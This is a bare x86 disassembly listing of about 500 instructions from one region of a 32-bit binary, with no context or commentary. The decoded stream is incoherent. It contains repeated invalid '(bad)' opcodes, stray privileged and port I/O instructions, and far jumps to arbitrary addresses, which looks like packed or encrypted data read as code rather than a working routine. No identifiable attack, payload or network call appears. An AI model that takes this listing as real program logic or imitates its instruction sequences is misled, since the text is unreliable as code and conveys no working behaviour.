  40afbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afbd:	push   ebp
  40afbe:	gs (bad) 
  40afc0:	loope  0x40af81
  40afc2:	sbb    BYTE PTR [ebp-0x7e],dl
  40afc5:	add    al,0x25
  40afc7:	hlt    
  40afc8:	test   DWORD PTR [ebx],ebx
  40afca:	das    
  40afcb:	mov    al,0xaa
  40afcd:	fsqrt  
  40afcf:	data16 icebp 
  40afd1:	mov    al,0xf3
  40afd3:	jo     0x40afc3
  40afd5:	push   0x49933ffe
  40afda:	push   ss
  40afdb:	add    BYTE PTR [esp+edx*2-0x77b81aba],cl
  40afe2:	lods   al,BYTE PTR ds:[esi]
  40afe3:	xor    DWORD PTR [ecx-0x24],edi
  40afe6:	and    bh,0xd
  40afe9:	loope  0x40afe9
  40afeb:	sbb    al,BYTE PTR [ebp+eax*1+0x2d]
  40afef:	test   eax,0xdffbe0ff
  40aff4:	pop    edx
  40aff5:	js     0x40afd5
  40aff7:	ret    0x79e2
  40affa:	ss mov dh,0x26
  40affd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40afff:	fimul  DWORD PTR [eax+0x345fbc15]
  40b005:	mov    WORD PTR [ecx+0x7ffc46f9],ss
  40b00b:	cmc    
  40b00c:	pop    ebx
  40b00d:	inc    ebx
  40b00e:	xor    DWORD PTR [edi],0xa6a8f8a5
  40b014:	addr16 xor eax,0xaa7b411b
  40b01a:	nop
  40b01b:	(bad)  
  40b01c:	push   ebp
  40b01d:	aad    0xf4
  40b01f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b020:	sbb    edx,DWORD PTR [ebx+0x7c]
  40b023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b024:	or     DWORD PTR [edi-0x693b390b],esp
  40b02a:	sub    DWORD PTR [eax],ebp
  40b02c:	(bad)  [esi-0xc]
  40b02f:	dec    esp
  40b030:	jg     0x40afb4
  40b032:	and    al,0xed
  40b034:	mov    ecx,0x7260f406
  40b039:	mov    bh,0x5a
  40b03b:	shl    BYTE PTR [ebp+0x3855fd4b],0xa5
  40b042:	mov    edx,es
  40b044:	sbb    dl,BYTE PTR [ebx-0xd77c85f]
  40b04a:	call   0xde61a80c
  40b04f:	pop    ebx
  40b050:	shr    ecx,cl
  40b052:	push   esp
  40b053:	mov    cl,0x32
  40b055:	lock sahf 
  40b057:	ins    BYTE PTR es:[edi],dx
  40b058:	scas   eax,DWORD PTR es:[edi]
  40b059:	xchg   edi,eax
  40b05a:	xor    ecx,DWORD PTR [ebx+0x13]
  40b05d:	and    ch,BYTE PTR [edi]
  40b05f:	nop
  40b060:	and    DWORD PTR [edi],esi
  40b062:	vxorps xmm0,xmm0,XMMWORD PTR [ebx+edx*1-0xa]
  40b068:	loope  0x40b0cc
  40b06a:	retf   0xa2de
  40b06d:	int3   
  40b06e:	out    dx,al
  40b06f:	mov    cl,0x11
  40b071:	sub    al,0xe8
  40b073:	pop    ecx
  40b074:	push   cs
  40b075:	test   BYTE PTR [eax+0x41],bl
  40b078:	xor    DWORD PTR [esi-0x7f],edx
  40b07b:	jecxz  0x40b031
  40b07d:	shl    DWORD PTR [edi-0x6dbf1887],cl
  40b083:	adc    edx,edx
  40b085:	in     eax,dx
  40b086:	enter  0x6364,0x9e
  40b08a:	aas    
  40b08b:	sbb    DWORD PTR [eax+0x6f53ad4d],ecx
  40b091:	sub    DWORD PTR [esi],ebp
  40b093:	fstp   DWORD PTR [edi-0x6a4e40a7]
  40b099:	dec    esi
  40b09a:	mov    cl,0xf2
  40b09c:	sub    al,dh
  40b09e:	jl     0x40b0a9
  40b0a0:	jmp    0x7718:0x281aeca6
  40b0a7:	rcr    BYTE PTR ds:0xa116873d,0x1f
  40b0ae:	and    al,0xa4
  40b0b0:	std    
  40b0b1:	sbb    ebx,DWORD PTR [esi+0x1a]
  40b0b4:	fs fs adc eax,0x2004b182
  40b0bb:	mov    dl,0x2
  40b0bd:	rcl    DWORD PTR [eax],1
  40b0bf:	aam    0xa4
  40b0c1:	fisubr WORD PTR [ecx+0x6adbfbf]
  40b0c7:	sbb    DWORD PTR [edx-0x62],ebp
  40b0ca:	add    cl,bl
  40b0cc:	or     eax,0xe98c58b9
  40b0d1:	in     al,0xfc
  40b0d3:	jecxz  0x40b149
  40b0d5:	ja     0x40b113
  40b0d7:	lods   al,BYTE PTR ds:[esi]
  40b0d8:	out    0x25,eax
  40b0da:	pop    esp
  40b0db:	(bad)  
  40b0dd:	mov    ebp,0xa88a3be1
  40b0e2:	dec    esp
  40b0e3:	call   FWORD PTR [esi+0x1c]
  40b0e6:	or     cl,BYTE PTR [esi]
  40b0e8:	adc    eax,0x4731da60
  40b0ed:	jo     0x40b150
  40b0ef:	leave  
  40b0f0:	dec    edi
  40b0f1:	or     esp,edx
  40b0f3:	mov    esi,0x4ebca9ad
  40b0f8:	fsubr  DWORD PTR [edx]
  40b0fa:	xlat   BYTE PTR ds:[ebx]
  40b0fb:	adc    BYTE PTR [edi],dl
  40b0fd:	imul   DWORD PTR [esi]
  40b0ff:	test   eax,0x6ca06d3b
  40b104:	push   edx
  40b105:	(bad)  
  40b106:	fld    DWORD PTR [eax]
  40b108:	call   0x66b9:0x823c640e
  40b10f:	in     eax,0x59
  40b111:	repnz sbb bl,BYTE PTR [ebp+0x2431c1ca]
  40b118:	les    esi,FWORD PTR [eax]
  40b11a:	arpl   WORD PTR [ecx+0x5b],ax
  40b11d:	mov    edi,0xf3bf5471
  40b122:	xchg   ebp,eax
  40b123:	out    dx,eax
  40b124:	mov    bh,0xcd
  40b126:	mov    ah,0x6e
  40b128:	mov    ebx,DWORD PTR [esi]
  40b12a:	pusha  
  40b12b:	std    
  40b12c:	lahf   
  40b12d:	sbb    BYTE PTR ss:[edi-0x49],cl
  40b131:	js     0x40b170
  40b133:	les    esp,FWORD PTR [eax+0x6aff59b4]
  40b139:	mov    dl,0xe3
  40b13b:	mov    ecx,DWORD PTR [edi+0x58619f6e]
  40b141:	mov    bl,0x64
  40b143:	idiv   esi
  40b145:	xor    bl,BYTE PTR [eiz*1-0xcbc7c5c]
  40b14c:	cs xchg esp,eax
  40b14e:	and    dl,al
  40b150:	in     al,0x65
  40b152:	pop    ebp
  40b153:	and    al,0x5b
  40b155:	imul   ebx,DWORD PTR [edi+ecx*4],0x6e
  40b159:	das    
  40b15a:	adc    ecx,ebx
  40b15c:	and    ebp,DWORD PTR [eax-0x51389421]
  40b162:	cmp    BYTE PTR [ebx],bl
  40b164:	pop    esi
  40b165:	pop    es
  40b166:	dec    edx
  40b167:	xlat   BYTE PTR ds:[ebx]
  40b168:	sub    al,0xa2
  40b16a:	sub    bh,BYTE PTR [edi-0x7361461d]
  40b170:	cmp    BYTE PTR [ebx+edx*4+0x6c68c31d],cl
  40b177:	cli    
  40b178:	inc    eax
  40b179:	push   DWORD PTR [ebp+0x711efc08]
  40b17f:	cmc    
  40b180:	sub    BYTE PTR [eax+0x3dd28d14],bl
  40b186:	das    
  40b187:	out    0xbf,eax
  40b189:	(bad)  
  40b18a:	jge    0x40b1f5
  40b18c:	out    0x1f,al
  40b18e:	mov    DWORD PTR [esi+0x7ccc91a7],0x6714fdc5
  40b198:	inc    eax
  40b199:	cmp    bl,BYTE PTR [ebx]
  40b19b:	(bad)  
  40b19c:	icebp  
  40b19d:	fbstp  TBYTE PTR ds:[ebx+0x2d]
  40b1a1:	popf   
  40b1a2:	iret   
  40b1a3:	pop    edi
  40b1a4:	mov    es,WORD PTR [edx]
  40b1a6:	cs hlt 
  40b1a8:	ins    BYTE PTR es:[edi],dx
  40b1a9:	inc    esp
  40b1aa:	mov    al,ds:0xead6127b
  40b1af:	out    dx,eax
  40b1b0:	adc    edx,edx
  40b1b2:	adc    bl,al
  40b1b4:	mov    BYTE PTR [eax-0x53],bl
  40b1b7:	push   edx
  40b1b8:	lods   eax,DWORD PTR ds:[esi]
  40b1b9:	mov    bl,0x12
  40b1bb:	push   eax
  40b1bc:	cmp    eax,0x9324dba9
  40b1c1:	push   ecx
  40b1c2:	cdq    
  40b1c3:	mov    ah,0x3b
  40b1c5:	clc    
  40b1c6:	jp     0x40b1e6
  40b1c8:	adc    eax,0x475dc860
  40b1cd:	mov    BYTE PTR [ecx],ah
  40b1cf:	xor    esi,ecx
  40b1d1:	jmp    0x40b214
  40b1d3:	mov    dl,0xe3
  40b1d5:	dec    edi
  40b1d6:	cwde   
  40b1d7:	xor    al,cl
  40b1d9:	cmp    DWORD PTR [eax-0x37],0xf984c346
  40b1e0:	pop    es
  40b1e1:	aas    
  40b1e2:	adc    DWORD PTR es:[edx-0x18252119],edx
  40b1e9:	xchg   ebx,eax
  40b1ea:	xchg   DWORD PTR [esi],edx
  40b1ec:	loope  0x40b214
  40b1ee:	test   BYTE PTR [ebp-0x714f305],ah
  40b1f4:	push   ebx
  40b1f5:	stos   BYTE PTR es:[edi],al
  40b1f6:	dec    edi
  40b1f7:	aam    0x9a
  40b1f9:	sub    eax,0xf843673b
  40b1fe:	and    ebp,ebp
  40b200:	out    0x91,eax
  40b202:	adc    BYTE PTR [esi-0x3570eb59],dh
  40b208:	inc    ecx
  40b209:	jmp    0xab67:0x9a6b25f8
  40b210:	or     al,al
  40b212:	sbb    BYTE PTR [ecx],bh
  40b214:	arpl   WORD PTR [esp+ebp*8-0xe],cx
  40b218:	test   edx,eax
  40b21a:	dec    eax
  40b21b:	add    eax,0x60cd827e
  40b220:	pop    esi
  40b221:	test   eax,0x3aee55f8
  40b226:	lods   eax,DWORD PTR ds:[esi]
  40b227:	lahf   
  40b228:	cmp    eax,0x2b80bb58
  40b22d:	pop    ecx
  40b22e:	test   DWORD PTR [ecx-0x3a],ebp
  40b231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b232:	dec    esi
  40b233:	fst    QWORD PTR [ebp-0x5d]
  40b236:	(bad)  
  40b237:	imul   BYTE PTR [ebp+0x5d834bc1]
  40b23d:	das    
  40b23e:	sahf   
  40b23f:	cli    
  40b240:	test   al,0x34
  40b242:	bnd ret 0xda82
  40b246:	ins    DWORD PTR es:[edi],dx
  40b247:	xchg   ebp,eax
  40b248:	rol    ecx,1
  40b24a:	xor    ecx,ebx
  40b24c:	pop    esi
  40b24d:	mov    ebp,0x86944b12
  40b252:	(bad)  
  40b253:	retf   0x7502
  40b256:	mov    ds:0xcafff958,eax
  40b25b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b25c:	nop
  40b25d:	int    0xa
  40b25f:	ffreep st(6)
  40b261:	cdq    
  40b262:	add    DWORD PTR [ebp+0xc],edx
  40b265:	shl    BYTE PTR es:[ebp-0x64],1
  40b269:	xchg   DWORD PTR [esi-0x7b],ebp
  40b26c:	jbe    0x40b1f7
  40b26e:	adc    bl,BYTE PTR [ebp+0x33fcc9f4]
  40b274:	popf   
  40b275:	adc    DWORD PTR [edx],ebp
  40b277:	xchg   edi,eax
  40b278:	push   ecx
  40b279:	loope  0x40b219
  40b27b:	pop    ecx
  40b27c:	sti    
  40b27d:	jmp    0x40b28d
  40b27f:	mov    ch,BYTE PTR [ebx+0x1fdb5b1c]
  40b285:	out    0xcf,al
  40b287:	mov    bh,ah
  40b289:	scas   al,BYTE PTR es:[edi]
  40b28a:	mov    bh,0x8
  40b28c:	add    esp,ebp
  40b28e:	dec    ebx
  40b28f:	clc    
  40b290:	aam    0xeb
  40b292:	popa   
  40b293:	outs   dx,BYTE PTR ds:[esi]
  40b294:	lods   eax,DWORD PTR ds:[esi]
  40b295:	jns    0x40b2fb
  40b297:	ret    
  40b298:	mov    al,0x2b
  40b29a:	das    
  40b29b:	enter  0x91ca,0x8e
  40b29f:	adc    bh,BYTE PTR [ecx+0x77]
  40b2a2:	xor    DWORD PTR [edi+0x6d8919b7],eax
  40b2a8:	test   DWORD PTR [esi-0xb9889c6],ebp
  40b2ae:	lahf   
  40b2af:	mov    al,0x9f
  40b2b1:	dec    ebp
  40b2b2:	fldcw  WORD PTR [ebx-0x5a]
  40b2b5:	pop    ds
  40b2b6:	lahf   
  40b2b7:	mov    dl,0x28
  40b2b9:	enter  0xe09d,0x82
  40b2bd:	in     eax,0xb3
  40b2bf:	push   ebx
  40b2c0:	mov    ch,0x1f
  40b2c2:	inc    esi
  40b2c3:	xor    ch,BYTE PTR [edx-0x6288a2e2]
  40b2c9:	retf   
  40b2ca:	out    dx,al
  40b2cb:	pop    ebx
  40b2cc:	jl     0x40b2ed
  40b2ce:	jmp    0x40b2b3
  40b2d0:	adc    BYTE PTR [edx-0x29f03f60],bl
  40b2d6:	(bad)  
  40b2d7:	push   edi
  40b2d8:	jns    0x40b328
  40b2da:	inc    edx
  40b2db:	data16 cli 
  40b2dd:	mov    cl,0x38
  40b2df:	pop    ss
  40b2e0:	adc    al,0xc9
  40b2e2:	pop    esp
  40b2e3:	dec    esp
  40b2e4:	aas    
  40b2e5:	inc    esp
  40b2e6:	cmp    DWORD PTR [esi],ebx
  40b2e8:	cli    
  40b2e9:	stos   DWORD PTR es:[edi],eax
  40b2ea:	push   esp
  40b2eb:	out    dx,al
  40b2ec:	lea    edi,[ecx]
  40b2ee:	(bad)  
  40b2ef:	jmp    0x7a2d:0x4ad08e25
  40b2f6:	dec    esp
  40b2f7:	inc    edx
  40b2f8:	call   0x6c0f088d
  40b2fd:	dec    eax
  40b2fe:	jne    0x40b32a
  40b300:	jns    0x40b306
  40b302:	cmp    eax,edi
  40b304:	pushf  
  40b305:	sub    esp,DWORD PTR [ecx+edi*8+0x2a2a0c54]
  40b30c:	fld    TBYTE PTR [esi+0x24]
  40b30f:	xchg   edi,eax
  40b310:	(bad)  
  40b311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b312:	outs   dx,DWORD PTR ds:[esi]
  40b313:	xchg   edx,eax
  40b314:	in     al,dx
  40b315:	pusha  
  40b316:	xlat   BYTE PTR ds:[ebx]
  40b317:	cmc    
  40b318:	std    
  40b319:	inc    edx
  40b31a:	mov    cl,0xcb
  40b31c:	lock (bad) 
  40b31e:	mov    ecx,0x4274d5e3
  40b323:	push   ebx
  40b324:	inc    ebp
  40b325:	jnp    0x40b391
  40b327:	add    BYTE PTR [ebx+esi*2-0x36],ch
  40b32b:	cwde   
  40b32c:	mov    edi,0x1874c3fe
  40b331:	mov    ah,0x13
  40b333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b334:	cmp    edx,DWORD PTR [edx]
  40b336:	push   eax
  40b337:	rcl    BYTE PTR [edi+0x12],1
  40b33a:	jmp    0x5c72:0xfe17216e
  40b341:	gs jns 0x40b2cd
  40b344:	push   0x2d0251f5
  40b349:	ret    
  40b34a:	pop    ecx
  40b34b:	test   BYTE PTR [edi+0x7a412169],bh
  40b351:	xchg   ebp,eax
  40b352:	adc    al,0xcb
  40b354:	shl    DWORD PTR [ecx],0xfe
  40b357:	es adc al,0x87
  40b35a:	fstp   DWORD PTR [edi]
  40b35c:	jecxz  0x40b2fc
  40b35e:	sbb    eax,0x73cce769
  40b363:	rcr    DWORD PTR [ebx-0x45311280],1
  40b369:	xchg   ebx,eax
  40b36a:	sbb    eax,0xa1d0b77b
  40b36f:	cld    
  40b370:	hlt    
  40b371:	mov    eax,ds:0x3f9ce6f
  40b376:	xor    DWORD PTR [esi],ebp
  40b378:	out    dx,al
  40b379:	stos   BYTE PTR es:[edi],al
  40b37a:	and    edx,DWORD PTR [ebx+0x1220cc2b]
  40b380:	or     BYTE PTR cs:[edi-0xa],ah
  40b384:	or     DWORD PTR [esi+0x2708fd42],eax
  40b38a:	lock mov ds:0x8a334273,eax
  40b390:	xchg   edx,eax
  40b391:	pop    ebx
  40b392:	jns    0x40b391
  40b394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b395:	add    al,0x85
  40b397:	test   al,0x3b
  40b399:	stos   BYTE PTR es:[edi],al
  40b39a:	cmc    
  40b39b:	out    dx,eax
  40b39c:	rol    BYTE PTR [ebx],cl
  40b39e:	adc    BYTE PTR [ebp-0x1205a02],bh
  40b3a4:	bnd jae 0x40b370
  40b3a7:	pop    edx
  40b3a8:	repnz shl dl,cl
  40b3ab:	scas   al,BYTE PTR es:[edi]
  40b3ac:	ja     0x40b33a
  40b3ae:	inc    edx
  40b3af:	inc    edi
  40b3b0:	gs pop eax
  40b3b2:	adc    eax,0x6be1a6d
  40b3b7:	inc    ebp
  40b3b8:	inc    esp
  40b3b9:	dec    esp
  40b3ba:	mov    ds:0x805c759f,eax
  40b3bf:	aad    0xf0
  40b3c1:	mov    esp,esp
  40b3c3:	xchg   ah,ch
  40b3c5:	mov    esp,edx
  40b3c7:	add    dl,BYTE PTR [ebx+0x14]
  40b3ca:	(bad)  
  40b3cb:	mov    cl,0xf9
  40b3cd:	inc    ebx
  40b3ce:	adc    BYTE PTR [edx-0x67],dl
  40b3d1:	mov    dl,0xf0
  40b3d3:	dec    DWORD PTR [edi-0x1d]
  40b3d6:	inc    esi
  40b3d7:	jne    0x40b3f1
  40b3d9:	into   
  40b3da:	xchg   ecx,eax
  40b3db:	fistp  DWORD PTR [esi-0x2d]
  40b3de:	(bad)  
  40b3e0:	mov    ds,WORD PTR [edi]
  40b3e2:	repnz add cl,al
  40b3e5:	mov    dl,0xd9
  40b3e7:	push   edi
  40b3e8:	adc    BYTE PTR [ecx+ecx*1],cl
  40b3eb:	lahf   
  40b3ec:	jns    0x40b3a3
  40b3ee:	and    al,0x26
  40b3f0:	add    DWORD PTR [ebx-0x77],0x9b63f1d7
  40b3f7:	les    ebp,FWORD PTR [ebx]
  40b3f9:	lds    edi,FWORD PTR [edi-0x41a278cd]
  40b3ff:	in     eax,dx
  40b400:	cmp    esp,DWORD PTR [ecx*8-0x7a0dd372]
  40b407:	clc    
  40b408:	mov    esi,0x887802cb
  40b40d:	mov    esp,0x13e2a5a6
  40b412:	ss mov edx,esi
  40b415:	(bad)  
  40b416:	mov    esp,0xae62b45c
  40b41b:	xor    edx,DWORD PTR [edx+0xd]
  40b41e:	mov    ?,WORD PTR [esi+0x239b0773]
  40b424:	lock dec eax
  40b426:	fbld   TBYTE PTR [esi-0x21]
  40b429:	out    dx,al
  40b42a:	adc    ch,BYTE PTR ds:0xfb491c9d
  40b430:	dec    ecx
  40b431:	dec    edi
  40b432:	and    ah,BYTE PTR [ecx+0xc]
  40b435:	mov    al,0x4b
  40b437:	mov    ebp,0xeeb199dd
  40b43c:	sbb    al,0xab
  40b43e:	mov    edi,DWORD PTR [ecx-0x62]
  40b441:	jo     0x40b476
  40b443:	sbb    eax,0x2b650a6c
  40b448:	popf   
  40b449:	xor    al,0x45
  40b44b:	dec    esp
  40b44c:	pop    ebx
  40b44d:	pop    es
  40b44e:	mov    bh,0xfd
  40b450:	sbb    al,BYTE PTR [edi-0x3b]
  40b453:	jmp    eax
  40b455:	mov    ebx,0xdfb2c94a
  40b45a:	jge    0x40b458
  40b45c:	xor    al,0x4f
  40b45e:	shl    DWORD PTR [eax],cl
  40b460:	repz les ecx,FWORD PTR [ebx+0xb]
  40b464:	adc    BYTE PTR [ecx],cl
  40b466:	int    0xe7
  40b468:	icebp  
  40b469:	repz add al,0xaa
  40b46c:	pop    edi
  40b46d:	call   0xc7f91111
  40b472:	or     bh,BYTE PTR [eax]
  40b474:	ss inc eax
  40b476:	ds inc ecx
  40b478:	or     esi,ebx
  40b47a:	jecxz  0x40b43c
  40b47c:	fisub  DWORD PTR [esi+eiz*2-0x47298bfc]
  40b483:	popf   
  40b484:	cmp    eax,0xec8ff0fe
  40b489:	sbb    eax,0x2448e9eb
  40b48e:	ret    0xc052
  40b491:	repnz scas al,BYTE PTR es:[edi]
  40b493:	jmp    FWORD PTR [esi]
  40b495:	mov    edi,0x46d14633
  40b49a:	in     eax,0xeb
  40b49c:	sub    eax,0x3ab5ebb3
  40b4a1:	test   eax,0xe463603a
  40b4a6:	dec    DWORD PTR [edi]
  40b4a8:	xor    eax,0x549d72c8
  40b4ad:	div    DWORD PTR [edi+0xf15538f]
  40b4b3:	aas    
  40b4b4:	dec    esi
  40b4b5:	xchg   esp,eax
  40b4b6:	movntq QWORD PTR [eax+edi*1],mm3
  40b4ba:	test   DWORD PTR [esi],0x73f10962
  40b4c0:	leave  
  40b4c1:	dec    esp
  40b4c2:	sbb    ecx,0xffffffee
  40b4c5:	out    dx,al
  40b4c6:	sub    BYTE PTR [edx-0x3f],dl
  40b4c9:	leave  
  40b4ca:	mov    ds:0x4a0f93,eax
  40b4cf:	xchg   ebx,eax
  40b4d0:	dec    esi
  40b4d1:	popf   
  40b4d2:	stc    
  40b4d3:	aam    0xd7
  40b4d5:	mov    eax,ds:0x42bed718
  40b4da:	(bad)  
  40b4db:	xchg   ecx,eax
  40b4dc:	xchg   edi,eax
  40b4dd:	sub    DWORD PTR [ecx+eiz*1],ebx
  40b4e0:	dec    edx
  40b4e1:	aad    0x99
  40b4e3:	pop    edx
  40b4e4:	mov    ebp,0xd7d0eee1
  40b4e9:	xchg   DWORD PTR [ecx-0x56],esp
  40b4ec:	fcomp  QWORD PTR [eax+edi*4]
  40b4ef:	je     0x40b55e
  40b4f1:	mov    al,0x25
  40b4f3:	add    eax,0x1e7572fa
  40b4f8:	scas   al,BYTE PTR es:[edi]
  40b4f9:	cmp    al,0x14
  40b4fb:	sbb    eax,0x4b7aabd3
  40b500:	or     cl,BYTE PTR [ecx+0x21]
  40b503:	cmp    eax,0x6a8ed5f2
  40b508:	mov    esi,0x95c2e580
  40b50d:	push   edx
  40b50e:	add    eax,0x2ea9f4e4
  40b513:	pop    ecx
  40b514:	pop    ebp
  40b515:	sbb    al,0xe7
  40b517:	into   
  40b518:	sbb    BYTE PTR [eax-0x16],cl
  40b51b:	xchg   DWORD PTR [ecx+eiz*1],ebx
  40b51e:	nop
  40b51f:	jbe    0x40b4e8
  40b521:	shl    BYTE PTR [ecx+ebx*8+0x133e7814],1
  40b528:	or     eax,0x43cc1fb3
  40b52d:	xchg   ebp,eax
  40b52e:	jae    0x40b509
  40b530:	pop    ss
  40b531:	jg     0x40b5aa
  40b533:	mov    edx,0xbe2f5daa
  40b538:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b53a:	in     al,0x3c
  40b53c:	arpl   bx,ax
  40b53e:	push   eax
  40b53f:	retf   
  40b540:	pop    esi
  40b541:	addr16 out 0x46,eax
  40b544:	(bad)  [esi-0x46]
  40b547:	pop    eax
  40b548:	push   edx
  40b549:	popf   
  40b54a:	arpl   si,bx
  40b54c:	mov    eax,gs:0x2e976dd
  40b552:	pop    esp
  40b553:	sbb    esi,DWORD PTR [edx-0x42]
  40b556:	mov    ds:0x5fc05b07,al
  40b55b:	or     al,0x8e
  40b55d:	xor    ch,al
  40b55f:	dec    esi
  40b560:	pop    ebx
  40b561:	mov    BYTE PTR [eax],bl
  40b563:	data16 and BYTE PTR [ebx],dh
  40b566:	int    0x5c
  40b568:	hlt    
  40b569:	push   eax
  40b56a:	mov    ch,0x27
  40b56c:	sahf   
  40b56d:	loopne 0x40b4f8
  40b56f:	lods   eax,DWORD PTR ds:[esi]
  40b570:	ins    BYTE PTR es:[edi],dx
  40b571:	fisubr DWORD PTR [edi+ebp*8]
  40b574:	fmul   QWORD PTR [ebp-0x70af9892]
  40b57a:	mov    esp,DWORD PTR [edx-0x80]
  40b57d:	xor    al,0xb7
  40b57f:	inc    DWORD PTR [edi]
  40b581:	cmp    bl,dh
  40b583:	mov    esi,0x9734910b
  40b588:	mov    cl,0x81
  40b58a:	rcr    DWORD PTR [eax+0x18],0x6c
  40b58e:	out    dx,al
  40b58f:	mov    al,0xd5
  40b591:	nop
  40b592:	mov    eax,ds:0xb73ff06b
  40b597:	sbb    DWORD PTR [edx+eax*1-0x6],0x5b
  40b59c:	push   esp
  40b59d:	xor    eax,DWORD PTR [esi]
  40b59f:	push   ebp
  40b5a0:	push   0x5d87b2b7
  40b5a5:	(bad)  
  40b5a6:	mov    ebp,DWORD PTR [ecx]
  40b5a8:	cdq    
  40b5a9:	ret    0x2793
  40b5ac:	fadd   st,st(6)
  40b5ae:	popf   
  40b5af:	(bad)  
  40b5b1:	ds jmp 0xffee:0x419fe21
  40b5b9:	pop    es
  40b5ba:	inc    ecx
  40b5bb:	outs   dx,BYTE PTR ds:[esi]
  40b5bc:	es jmp 0x40b618
  40b5bf:	jl     0x40b5d1
  40b5c1:	pop    ds
  40b5c2:	arpl   WORD PTR [eax+0x72],ax
  40b5c5:	xchg   DWORD PTR [eax],ebx
  40b5c7:	repz add eax,0x85f7bd15
  40b5cd:	in     eax,dx
  40b5ce:	sub    dl,dh
  40b5d0:	dec    edx
  40b5d1:	mov    ds:0x46125f08,al
  40b5d6:	nop
  40b5d7:	inc    edi
  40b5d8:	or     BYTE PTR [esi+0x68],bl
  40b5db:	or     al,al
  40b5dd:	sbb    eax,0x245a3945
  40b5e2:	stos   DWORD PTR es:[edi],eax
  40b5e3:	bound  ecx,QWORD PTR [eax]
  40b5e5:	cli    
  40b5e6:	out    0x4e,al
  40b5e8:	dec    ecx
  40b5e9:	inc    esp
  40b5ea:	ins    BYTE PTR es:[edi],dx
  40b5eb:	xor    DWORD PTR [eax+0x5f2dee39],0xb3f71ea0
  40b5f5:	adc    eax,0xbb7c8810
  40b5fa:	xchg   esp,eax
  40b5fb:	mov    ch,0x5e
  40b5fd:	pcmpgtb mm2,mm1
  40b600:	or     eax,0x95c07cf0
  40b605:	jns    0x40b590
  40b607:	xor    BYTE PTR [edx+0x95de653],cl
  40b60d:	arpl   bx,bx
  40b60f:	(bad)  
  40b610:	jns    0x40b66f
  40b612:	mov    ebx,0xf6608553
  40b617:	add    BYTE PTR [esi],0x5a
  40b61a:	add    BYTE PTR [edx-0x11],al
  40b61d:	jne    0x40b5fe
  40b61f:	call   0x40989659
  40b624:	cmp    bh,ch
  40b626:	cmp    al,0x82
  40b628:	fcomp  DWORD PTR [edi+0x5c]
  40b62b:	xor    bl,BYTE PTR [ebp-0x51e4a1bd]
  40b631:	je     0x40b65c
  40b633:	test   al,0x4a
  40b635:	pop    esp
  40b636:	shl    DWORD PTR [esi],cl
  40b638:	xchg   bl,ah
  40b63a:	push   ds
  40b63b:	dec    ecx
  40b63c:	shr    DWORD PTR [edx+0x6bbafa9b],cl
  40b642:	jg     0x40b687
  40b644:	sub    dl,bh
  40b646:	and    BYTE PTR [eax],cl
  40b648:	lock mov ds:0x9de95fa4,al
  40b64e:	(bad)  
  40b64f:	adc    BYTE PTR [edi-0x2a791e6e],ah
  40b655:	jno    0x40b6d3
  40b657:	out    0xb,eax
  40b659:	arpl   WORD PTR [eax+0x67],sp
  40b65c:	xchg   esp,eax
  40b65d:	push   bx
  40b65f:	imul   ebx,DWORD PTR [eax-0x3d6bf4c1],0x98c63173
  40b669:	sbb    BYTE PTR [esi+0x1d],cl
  40b66c:	fwait
  40b66d:	xchg   ebx,eax
  40b66e:	cmp    al,0x97
  40b670:	test   BYTE PTR [edx-0x2e8bf8ba],dh
  40b676:	jg     0x40b633
  40b678:	add    eax,0x942e180d
  40b67d:	in     eax,0x44
  40b67f:	mov    al,ds:0xb3ca249a
  40b684:	es pop esi
  40b686:	enter  0x78fe,0xee
  40b68a:	in     al,dx
  40b68b:	icebp  
  40b68c:	xchg   DWORD PTR [ebx+edx*8-0x4b],ebp
  40b690:	jb     0x40b658
  40b692:	cld    
  40b693:	(bad)  
  40b694:	(bad)  
  40b696:	mov    cl,0xca
  40b698:	cld    
  40b699:	jl     0x40b677
  40b69b:	xor    BYTE PTR [ecx],0xf2
  40b69e:	hlt    
  40b69f:	scas   eax,DWORD PTR es:[edi]
  40b6a0:	adc    esi,DWORD PTR [ebp+0x7055f61e]
  40b6a6:	loop   0x40b6ec
  40b6a8:	mov    dl,0x65
  40b6aa:	sbb    BYTE PTR [eax-0x7c],0x77
  40b6ae:	mov    edi,0x80260caa
  40b6b3:	pop    esi
  40b6b4:	or     al,BYTE PTR [edx]
  40b6b6:	xchg   edi,eax
  40b6b7:	add    ebp,DWORD PTR [ebx]
  40b6b9:	(bad)  
  40b6ba:	cmc    
  40b6bb:	mov    cs,ecx
  40b6bd:	daa    
  40b6be:	call   DWORD PTR [edi+esi*4-0x6c68ac52]
  40b6c5:	mov    es,WORD PTR [ebp-0x6dab8eb7]
  40b6cb:	pop    ss
  40b6cc:	inc    ecx
  40b6cd:	cmp    BYTE PTR [eax+eiz*8+0x429f3ca3],al
  40b6d4:	ins    DWORD PTR es:[edi],dx
  40b6d5:	(bad)  [edi+edi*4+0xb]
  40b6d9:	sbb    esi,esi
  40b6db:	mov    edx,0xae1e2cc8
  40b6e0:	inc    ebx
  40b6e1:	pop    edx
  40b6e2:	aaa    
  40b6e3:	shl    DWORD PTR [esi-0x80238ea],1
  40b6e9:	push   esi
  40b6ea:	push   ebx
  40b6eb:	sub    BYTE PTR ds:0x2499ed2c,dl
  40b6f1:	sbb    ebp,DWORD PTR [ecx+eax*1-0x42]
  40b6f5:	retf   
  40b6f6:	mov    eax,ds:0xedc187c8
  40b6fb:	mov    bh,0x51
  40b6fd:	sbb    DWORD PTR [edi],esi
  40b6ff:	xor    bl,0x1b
  40b702:	into   
  40b703:	cmp    al,0xca
  40b705:	sbb    DWORD PTR [edi-0x71],0xffffff8e
  40b709:	push   ecx
  40b70a:	pusha  
  40b70b:	std    
  40b70c:	cwde   
  40b70d:	in     eax,0xc3
  40b70f:	or     ch,al
  40b711:	inc    edx
  40b712:	push   esp
  40b713:	scas   eax,DWORD PTR es:[edi]
  40b714:	mov    bl,0x77
  40b716:	div    DWORD PTR [edx+edi*2+0x5459d96e]
  40b71d:	lds    ebx,FWORD PTR [edi]
  40b71f:	dec    eax
